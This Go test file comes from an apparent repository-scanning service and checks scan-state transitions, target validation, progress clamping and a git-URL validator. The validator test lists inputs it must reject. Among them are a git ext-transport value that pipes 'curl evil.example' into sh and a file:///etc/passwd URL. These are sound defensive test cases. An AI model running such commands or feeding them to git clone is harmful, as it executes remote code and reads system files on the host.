package entity

import "testing"

func TestCanTransition(t *testing.T) {
	cases := []struct {
		from, to ScanState
		want     bool
	}{
		{ScanQueued, ScanRunning, true},
		{ScanRunning, ScanPaused, true},
		{ScanPaused, ScanRunning, true},
		{ScanRunning, ScanCompleted, true},
		{ScanFailed, ScanQueued, true},

		{ScanCompleted, ScanRunning, false},
		{ScanCancelled, ScanQueued, false},
		{ScanQueued, ScanCompleted, false},
		{ScanPaused, ScanCompleted, false},
	}

	for _, c := range cases {
		if got := CanTransition(c.from, c.to); got != c.want {
			t.Errorf("CanTransition(%s, %s) = %v, want %v", c.from, c.to, got, c.want)
		}
	}
}

func TestTerminalStates(t *testing.T) {
	if !ScanCompleted.Terminal() || !ScanCancelled.Terminal() {
		t.Error("completed and cancelled must be terminal")
	}
	if ScanFailed.Terminal() {
		t.Error("failed must not be terminal: it can be retried")
	}
	if ScanRunning.Terminal() || ScanPaused.Terminal() || ScanQueued.Terminal() {
		t.Error("active states must not be terminal")
	}
}

// validateRepoURL is a security boundary, not formatting: the value reaches
// `git clone`, and several git transports execute commands.
func TestValidateRepoURLRejectsDangerousTransports(t *testing.T) {
	bad := []string{
		"ext::sh -c 'curl evil.example|sh'",
		"file:///etc/passwd",
		"ssh://git@github.com/a/b.git",
		"git://github.com/a/b.git",
		"https://user:token@github.com/a/b.git", // embedded credentials
		"http://github.com/a/b.git",             // plaintext
		"https://",                              // no host
	}

	for _, u := range bad {
		if err := validateRepoURL(u); err == nil {
			t.Errorf("validateRepoURL(%q) accepted a URL it must reject", u)
		}
	}

	if err := validateRepoURL("https://github.com/owner/repo.git"); err != nil {
		t.Errorf("validateRepoURL rejected a valid URL: %v", err)
	}
}

func TestTargetValidate(t *testing.T) {
	if err := (Target{Kind: TargetUser, Value: "octocat"}).Validate(); err != nil {
		t.Errorf("valid user target rejected: %v", err)
	}
	if err := (Target{Kind: TargetUser, Value: "-bad-"}).Validate(); err == nil {
		t.Error("login starting with a hyphen must be rejected")
	}
	if err := (Target{Kind: TargetAllowlist}).Validate(); err == nil {
		t.Error("empty allowlist must be rejected")
	}
	if err := (Target{Kind: "everything"}).Validate(); err == nil {
		t.Error("unknown target kind must be rejected")
	}
}

func TestProgress(t *testing.T) {
	if got := (ScanJob{}).Progress(); got != 0 {
		t.Errorf("unknown total should report 0 progress, got %v", got)
	}
	if got := (ScanJob{ReposTotal: 4, ReposScanned: 1}).Progress(); got != 0.25 {
		t.Errorf("progress = %v, want 0.25", got)
	}
	// Discovery can add repos after scanning starts, so scanned may briefly
	// exceed the total it was compared against.
	if got := (ScanJob{ReposTotal: 2, ReposScanned: 5}).Progress(); got != 1 {
		t.Errorf("progress must clamp to 1, got %v", got)
	}
}
